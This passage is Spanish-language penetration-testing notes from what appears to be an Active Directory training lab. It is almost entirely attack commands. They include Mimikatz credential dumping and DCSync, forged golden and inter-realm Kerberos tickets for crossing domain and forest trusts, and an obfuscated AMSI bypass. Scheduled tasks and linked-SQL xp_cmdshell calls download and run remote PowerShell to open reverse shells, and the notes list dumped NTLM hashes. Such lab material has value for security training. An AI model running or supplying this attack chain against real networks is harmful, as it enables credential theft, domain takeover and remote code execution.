* `tgs::s4u /tgt:TGT_websvc@DOLLARCORP.MONEYCORP.LOCAL_krbtgt~dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL.kirbi /user:Administrator@dollarcorp.moneycorp.local /service:host/dcorp-mssql.dollarcorp.moneycorp.LOCAL|rpcss/dcorp-mssql.dollarcorp.moneycorp.LOCAL`

TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_websvc@DOLLARCORP.MONEYCORP.LOCAL.kirbi

Lanzamos Mimikatz:
* `Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_cifs~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi"'`
* `Invoke-Mimikatz -Command '"kerberos::ptt TGS_Administrator@dollarcorp.moneycorp.local@DOLLARCORP.MONEYCORP.LOCAL_websvc~dcorp-mssql.dollarcorp.moneycorp.LOCAL@DOLLARCORP.MONEYCORP.LOCAL.kirbi"'`
Ya podemos ejecutar comandos como administartor en el mssql
* `ls \\dcorp-mssql.dollarcorp.moneycorp.LOCAL\c$`
¿que más se puede hacer?

PivEsc DNSAdmins
------------------
Si conseguimos un usuario que esté en el grupo de administradores de los DNS y tiene la capacidad de reinicar el servicio (no por defecto) podremos inyectar una dll que nos permitira acceso como system en el DC.
Enumeramos usuarios del grupo:
* `Get-NetGroupMember -GroupName "DNSAdmins"`  -> srvadmin (a98e18228819e8eec3dfa33cb68b0728)
* `Get-ADGroupMember -Identity DNSAdmins`
Pash the hash del usuario con....

Enterprise admin
------------------------
Los dominios en el mismo bosque tienen por defecto asiganad una confianza de doble via. Hay una clave de confianza "trust key" que permite esa confianza.
Nos hace falta el hash de krbtgt.
Cuando el usuario pide un ticket TGS de un servicio de otro dominio, el DC de su dominio genera un ticket "inter-realm TGT" cifrado con la trust key, con ese ticket el usuario puede pedir el TGS al nuevo dominio.
Para conseguir la trust key:
* `Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc` --> [  In ] DOLLARCORP.MONEYCORP.LOCAL -> MONEYCORP.LOCAL 80ff2eed78d20a9de79b7ddfcc45c526
o 
* `Invoke-Mimikatz -Command '"lsadump::dcsync /user:dcorp\mcorp$"'` --> saca el hash ntlm del trust key --> 80ff2eed78d20a9de79b7ddfcc45c526

Creamos un inter-realm TGT con:
* `Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /rc4:80ff2eed78d20a9de79b7ddfcc45c526 /service:krbtgt /target:moneycorp.local /ticket:C:\AD\kekeo_old\trust_tkt.kirbi"' ` 
** sid: sid del dominio actual
** sids: sid del grupo de enterprais admins en el dominio padre --> S-1-5-21-280534878-1496970234-700767426-519
** user: usuario a impersonar
** rc4: hash del trust key --> 
** taget: FQDN del dominio padre	
** ticket: ticket de salida

Poniendo el sid del grupo de enterprise admins nos meterá automáticamente en ese grupo ya que confia en el inter-realm TGT que le envian por tener el trust key. Al ejecutarlo nos genera un trust ticket en la ruta. Se puede lanzar sin tener privilegios de administardor.
Ahora tenemos el ticket inter-realm TGT y hay que presentarlo para conseguir el TGS para el dc. se puede crear un ticket para un host u otro servicio.
* `.\asktgs.exe C:\AD\kekeo_old\trust_tkt.kirbi CIFS/mcorp-dc.moneycorp.local`
Usamos el TGS:
* `.\kirbikator.exe lsa .\CIFS.mcorp-dc.moneycorp.local.kirbi`
Podemos enumerar los ficheros ahora
* `ls \\mcorp-dc.moneycorp.local\c$`

Ahora vamos a intentar obtener el krbtgt de dollarcorp
* `Invoke-Mimikatz -Command '"lsadump::lsa /patch"'`
Ahora vamos a poner el hash de krbtgt del dc de dollarcorp.
Para sacar el krbtgt del dominio actual:
* `Invoke-Mimikatz -Command '"lsadump::dcsync	/user:dcorp\krbtgt"'`
* `Invoke-Mimikatz -Command '"kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /sids:S-1-5-21-280534878-1496970234-700767426-519 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /ticket:C:\AD\krbtgt_tkt.kirbi"'`
Ahora utilizamos el TGT para conseguir sesion en el ad:
* `Invoke-Mimikatz -Command '"kerberos::ptt C:\AD\krbtgt_tkt.kirbi"'`
Ahora tenemos acceso para listar o ejecutar wmi
* `gwmi -class win32_operatingsystem -ComputerName mcorpdc.moneycorp.local`
Ahora vamos a conseguir una shell. ponemos un puerto a escuchar con powercat
* `powercat -l -v -p 443 -t 1000`
Ejecutamos el comando con el gestor de tareas
* `schtasks /create /S mcorp-dc.moneycorp.local /SC Weekly /RU "NT Authority\SYSTEM" /TN "STCheck46" /TR "powershell.exe -c 'iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.46/Invoke-PowerShellTcpEx.ps1''')'"`
Ejecutamos la tareas:
* `schtasks /Run /S mcorp-dc.moneycorp.local /TN "STCheck46"`
BYpass del UAC
* `sET-ItEM ( 'V'+'aR' + 'IA' + 'blE:1q2' + 'uZx' ) ( [TYpE]( "{1}{0}"-F'F','rE') ) ; ( GeT-VariaBle ( "1Q2U" +"zX" ) -VaL)."A`ss`Embly"."GET`TY`Pe"(( "{6}{3}{1}{4}{2}{0}{5}" -f'Util','A','Amsi','.Management.','utomation.','s','System' ))."g`etf`iElD"( ( "{0}{2}{1}" -f'amsi','d','InitFaile' ),("{2}{4}{0}{1}{3}" -f 'Stat','i','NonPubli','c','c,' ))."sE`T`VaLUE"(${n`ULl},${t`RuE} )`
* ` iex (New-Object Net.WebClient).DownloadString('http://172.16.100.46/Invoke-Mimikatz.ps1')`
* `Invoke-Mimikatz -Command '"lsadump::lsa /patch"'`
** krbtgt --> ed277dd7a7a8a88d9ea0de839e454690
** Administrator --> 71d04f9d50ceb1f64de7a09f23e6dc4c
** dcorp$ --> f052addf1d43f864a7d0c21cbce440c9

DCShadow
---------
La persistencia se consigue introduciendo un controlador de dominio en el dominio (en principio en el dominio raiz) y desde el modificar los atributos de los objetos, como los cambios vienen de un dominio no generan logs. Hacen falta privilegios de DA.

Salto entre bosques
-----------------------
MIramos los hashes del DC de dollarcorp
Conseguimos el ticket del admin
* `Invoke-Mimikatz -Command '"sekurlsa::pth /user:svcadmin /domain:dollarcorp.moneycorp.local /ntlm:b38ff50264b74508085d82c69794a4d8 /run:powershell.exe"'` 
* `Invoke-Mimikatz -Command '"lsadump::lsa /patch"'` --> vemos los hashes del DC dollarcorp, en el vemos una cuenta "ecorp" --> 3dcdf96dd989a53e24ca4eebe4629ab2 es la trust key entre los dos dominios
Tambien podemos usar:
* `Invoke-Mimikatz -Command '"lsadump::trust /patch"' -ComputerName dcorp-dc.dollarcorp.moneycorp.local --> vemos que hay una confianza hacia [  In ] DOLLARCORP.MONEYCORP.LOCAL -> EUROCORP.LOCAL --> 3dcdf96dd989a53e24ca4eebe4629ab2`
Generamos un TGT para el dominio eurocorp.local
* `Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /rc4:3dcdf96dd989a53e24ca4eebe4629ab2 /service:krbtgt /target:eurocorp.local /ticket:C:\AD\kekeo_old\trust_forest_tkt.kirbi"'`
Solicitamos un TGS al nuevo dominio:
* `.\asktgs.exe C:\AD\kekeo_old\trust_forest_tkt.kirbi CIFS/eurocorp-dc.eurocorp.local`
Usamos el ticket:
* `.\kirbikator.exe lsa .\CIFS.eurocorp-dc.eurocorp.local.kirbi`
Ahora podemos listar los directorios compartidos entre bosques:
* `ls \\eurocorp-dc.eurocorp.local\SharedwithDCorp\`
* `cat \\eurocorpdc.eurocorp.local\SharedwithDCorp\secret.txt`

#MSSQLServer
--------------
Desde student46
* `Import-Module .\PowerUpSQL-master\PowerUpSQL.psd1`
Mirar los servidores SQL que hay en el dominio, genera falsos positivos:
* `Get-SQLInstanceDomain`
Para mirar si tenemos conectividad:
* `Get-SQLInstanceDomain | Get-SQLConnectionTestThreaded -Verbose`
Para ver más info:
* `Get-SQLInstanceDomain | Get-SQLServerInfo`

## Database Links
-----------------
Los links de la bse de datos permiten a SQL Server acceder a datos externos de otros servidores o interactuar con objeros OLE DB.
En caso de encontrarnos estos links podemos abusar de ellos para ejecutar procedimientos internos, se puede utilizar incluso através de confianza de bosques.
Para mirar los links de una base de datos:
* `Get-SQLServerLink -Instance dcorp-mssql -Verbose` --> Database Linkname: DCORP-SQL1 --> Databaselinklocation --> remote

Con la herramienta HeidiSQL, marcamos Microsoft SQL y que utilice las credenciales de windows, abrimos la sesion de la BD y podemos ejecutar sentencias:
* `select * from master..sysservers` --> para ver links -> DCORP-SQL1
Para ejecutar sentencias en la base de datos remota:
* `select * from openquery("dcorp-sql1",'select * from master..sysservers')` --> nos dice los links de la BD remota --> DCORP-MGMT
Para enumeras los links del dominio:
* `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Verbose` --> dcorp-mssql -> dcorp-sql1 -> dcorp-mgmt -> eu-sql.eu.eurocorp.local
Tambien se pueden ir encadenando las sentencias sql:
* `select * from openquery("dcorp-sql1",'select * from openquery("dcorpmgmt",''select * from master..sysservers'')')`
Para poder ejecutar comandos en el servidor remoto necesitamos que este activado xp_cmdshell, si no lo está podemos activarlocon rpcout (desactivado por defecto) con:
* `EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT "eu-sql"`
Para ejecutar comandos con powershell:
* `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'whoami'"` --> nos devuelve el usuario con el que está corriendo la base de datos en el servidor de eu-sql
* `select * from openquery("dcorp-sql1",'select * from openquery("dcorp-mgmt",''select * from openquery("eu-sql",''''select @@version as version;exec master..xp_cmdshell "powershell whoami")'''')'')')`
Para conseguir una shell reversa desde eu-sql:
* `powercat -l -v -p 443 -t 1000`
* `Get-SQLServerLinkCrawl -Instance dcorp-mssql -Query "exec master..xp_cmdshell 'powershell.exe -c iex (New-Object Net.WebClient).DownloadString(''http://172.16.100.46/Invoke-PowerShellTcpEx.ps1'')'"` --> tenemos shell
Desde eu-sql no ha funcionado:
* `"powershell.exe -c iex (New-Object Net.WebClient).DownloadString('http://172.16.100.46/Invoke-CleanUpByp.ps1')"`
* `Invoke-CleanUpByp -Command "powershell.exe -c iex (New-Object Net.WebClient).DownloadString('http://172.16.100.46/Invoke-PowerShellTcpEx2.ps1')"`
